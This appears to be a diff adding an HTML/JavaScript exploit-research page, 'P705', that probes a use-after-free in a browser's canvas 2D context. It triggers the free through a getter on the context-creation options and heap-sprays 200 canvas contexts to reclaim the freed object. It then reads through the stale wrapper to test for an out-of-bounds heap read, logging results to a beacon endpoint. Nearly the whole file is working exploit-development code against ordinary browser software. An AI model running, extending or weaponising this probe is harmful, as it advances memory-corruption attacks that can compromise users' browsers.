@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P705 — m_stateStack m_size desync (OOB read candidate)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P705 — can m_stateStack.m_size desync between the two aliases?
+ *
+ * The last untested path that uses PROVEN primitives (same-type
+ * alias only — no 768B forge, no AB reclaim of the context).
+ *
+ * Reference claim (pastawithpesto, FINDINGS/CONFIRMED_VULNS):
+ *   "stale wrapper retains m_stateStack.m_size = 9 (from 8 saves)
+ *    while the new ctx has m_size = 1. Reading last() through the
+ *    stale wrapper indexes buffer[8] = 2800 bytes past the end of
+ *    the 1-State buffer -> reads adjacent heap as float64."
+ *
+ * PROBLEM with that claim: m_stateStack is a member INSIDE the
+ * 768B context object. With same-type reclaim both JS handles point
+ * at ONE object, so they should share ONE m_size. If so, no desync.
+ *
+ * Two mechanisms are possible and this probe distinguishes them:
+ *   (A) m_size is read from the live shared object -> NO desync.
+ *       The read returns the reclaiming context's own value.
+ *   (B) the stale wrapper caches a size (or m_unrealizedSaveCount
+ *       at +592 is stale) -> desync -> last() indexes past the
+ *       inline State array -> OOB read of adjacent heap.
+ *
+ * Method, per section: build the VICTIM with VSAVES save() calls,
+ * UAF it, reclaim with a same-type context built with RSAVES saves
+ * and a distinctive lineWidth. Then read through the STALE wrapper.
+ *
+ *   - read == RSAVES marker   -> (A) shared, no desync
+ *   - read == garbage/other   -> (B) desync, possible OOB
+ *   - crash                   -> indexes into unmapped/poisoned mem
+ *
+ * Also dumps getLineDash() through the stale wrapper, since a
+ * desynced State would make the dash Vector read from a bogus
+ * m_buffer -> a second OOB channel.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P705-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,320))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+
+/* one UAF cycle: victim with vsaves, reclaiming context with rsaves */
+function cycle(tag, vsaves, rsaves, marker){
+  var inner=null;
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){
+    inner=cv.getContext('2d');
+    for(var s=0;s<vsaves;s++) inner.save();
+    return true;
+  }});
+  cv.getContext('bitmaprenderer', o);
+  raw(tag+'-UAF','inner='+(inner?'OK':'NULL')+'|vsaves='+vsaves);
+  if(!inner) return;
+
+  /* reclaim with a same-type context having RSaves saves */
+  var spray=[];
+  for(var i=0;i<200;i++){
+    var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){
+      for(var s2=0;s2<rsaves;s2++) sx.save();
+      sx.lineWidth=marker;
+      spray.push(sx);
+    }
+  }
+  raw(tag+'-SPRAY','n='+spray.length+'|rsaves='+rsaves+'|marker='+marker);
+
+  /* find which one reclaimed, via a write through the stale wrapper */
+  try{ inner.lineWidth=marker+0.5; }catch(e){ raw(tag+'-W-ERR',(e.message||'').slice(0,80)); }
+  var idx=-1;
+  for(var k=0;k<spray.length;k++){
+    try{ if(spray[k].lineWidth===marker+0.5){ idx=k; break; } }catch(e){}
+  }
+  raw(tag+'-ALIAS','idx='+idx);
+
+  /* THE TEST: set the alias to a marker, read through the stale wrapper.
+   * If shared, stale reads marker. If desynced, it reads elsewhere. */
+  if(idx>=0){
+    try{ spray[idx].lineWidth = marker; }catch(e){}
+  }
+  var got=null, err=null;
+  try{ got=inner.lineWidth; }catch(e){ err=(e.message||String(e)); }
+  if(err!==null){ raw(tag+'-READ-ERR',err.slice(0,120)); return; }
+
+  var bits=f64bits(got);
+  var verdict = (got===marker) ? 'SHARED-no-desync' :
+                (got===marker+0.5) ? 'STALE-CACHED-desync?' : 'OTHER';
+  raw(tag+'-READ','val='+got+'|bits='+hex(bits)+'|'+verdict);
+
+  /* second channel: dash vector through the stale wrapper */
+  try{
+    var d=inner.getLineDash();
+    raw(tag+'-DASH','len='+d.length+'|v0='+(d.length?d[0]:'-'));
+  }catch(e){ raw(tag+'-DASH-ERR',(e.message||'').slice(0,90)); }
+}
+
+function run(){
+  raw('BOOT','p705');
+  try{
+    /* Section matrix: victim saves vs reclaim saves.
+     * The reference's exact case is 8 vs 0. */
+    cycle('S1', 8, 0, 1111.5);   /* reference case: stale 9 vs live 1 */
+    setTimeout(function(){
+      cycle('S2', 0, 8, 2222.5); /* inverse */
+      setTimeout(function(){
+        cycle('S3', 16, 1, 3333.5); /* bigger gap */
+        setTimeout(function(){
+          raw('DONE','p705-complete');
+        }, 60);
+      }, 60);
+    }, 60);
+  }catch(e){ raw('ERR',(e.message||'').slice(0,140)); }
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P705 — m_size desync</pre></body></html>
